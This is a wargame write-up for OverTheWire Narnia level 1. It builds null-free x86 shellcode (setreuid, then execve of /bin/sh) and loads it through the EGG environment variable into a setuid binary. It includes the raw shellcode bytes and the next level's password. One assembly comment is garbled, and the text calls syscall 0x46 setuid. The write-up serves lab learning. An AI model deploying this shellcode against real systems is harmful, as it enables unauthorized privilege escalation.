# Overview
We get the following C code:
```
/*
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
   */
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

So if we set the EGG environment variable to a byte sequence that represents x86 instructions, we can execute code. For instance:
```
cd /narnia
export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'... my shellcode here...')")
./narnia1
```

Notes:
- the `/narnia/narnia1` is owned by user narnia2, and has the setuid bit on.
- the shellcode cannot contain any null bytes

# The shellcode
First things first, when writing the shellcode it's easier to use syscalls instead of libc calls, as mentioned [here](http://www.kernel-panic.it/security/shellcode/shellcode2.html). On x86 platforms, you do a syscall by putting the syscall number in EAX, and passing arguments in registers EBX, ECX, EDX, ESI, EDI, and EBP (there is a trick if the syscall expects more than 6 arguments). Then you invoke interrupt 0x80.

You can find the list of syscalls in the kernel include files, for instance:
- /usr/include/asm/unistd_32.h
- /usr/include/asm-generic/unistd.h
- /usr/src/linux/include/asm-i386/unistd.h

Here is below a shellcode that uses the `execve` syscall to spawn a shell. Please note that the shellcode first zeroes out the EAX, EBX, ECX, and EDX registers, and also uses a number of tricks to avoid having null bytes:
```
xor    eax,eax    ; set $eax to 0    
xor    ebx,ebx    ; set $ebx to 0    
xor    ecx,ecx    ; set $ecx to 0    
cdq               ; this effectively sets $edx to 0
push   0xb        ; the next two instructions set $eax to 0xb (syscall execve)        
pop    eax        ; (another trick to avoid null bytes)        
push   ecx        ; push 0x00000000 to the stack (that would be the trailing null byte for our command string) 
push   0x68732f2f ; push the string "//sh" to the stack (in reverse order) 
push   0x6e69622f ; push the string "" to the stack (in reverse order)
mov    ebx,esp    ; $ebx is execve pathname argument
push   ecx        ; push 0x00000000 to the stack
mov    edx,esp    ; $edx is execve envp argument (here it is NULL)
push   ebx        ; 
mov    ecx,esp    ; $ecx is execve argv argument (of  type char **)
int    0x80
```

That works, and I get a shell. However, when running the `id` command it says 14001 (narnia1). The `/narnia/narnia1` binary is setuid and owned by narnia2, so how comes the shell ends up being run as narnia1? The answer is that `sh` resets the effective UID if it doesn't match the real UID, unless the `-p` option is used. So two options here:
- call `setuid` to set the real UID to 14002 before calling `execve`
- pass the `-p` argument to `/bin/sh`, check out that [shellcode](https://shell-storm.org/shellcode/files/shellcode-606.html)

I went for the first option:
```
xor    eax,eax    
xor    ebx,ebx
xor    ecx,ecx    
mov    cx,0x36B2
mov    bx,0x36B2
mov    al,0x46    
int    0x80       
xor    ebx,ebx    
xor    ecx,ecx    
cdq               
push   0xb        
pop    eax        
push   ecx         
push   0x68732f2f 
push   0x6e69622f
mov    ebx,esp
push   ecx
mov    edx,esp
push   ebx
mov    ecx,esp
int    0x80
```

Resulting in the syscall `setuid(14002, 14002)`, then `execve('/bin/sh')`.

To set the environment variable:
```
export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x31\xC0\x31\xDB\x31\xC9\x66\xB9\xB2\x36\x66\xBB\xB2\x36\xB0\x46\xCD\x80\x31\xDB\x31\xC9\x99\x6A\x0B\x58\x51\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x51\x89\xE2\x53\x89\xE1\xCD\x80')")
```

Password for the next level is:
```
5agRAXeBdG
```

# Note
The write-up from https://axcheron.github.io/writeups/otw/narnia/ is incorrect here. The shellcode neither calls `setuid`, nor it passes the `-p` argument to `/bin/sh`.
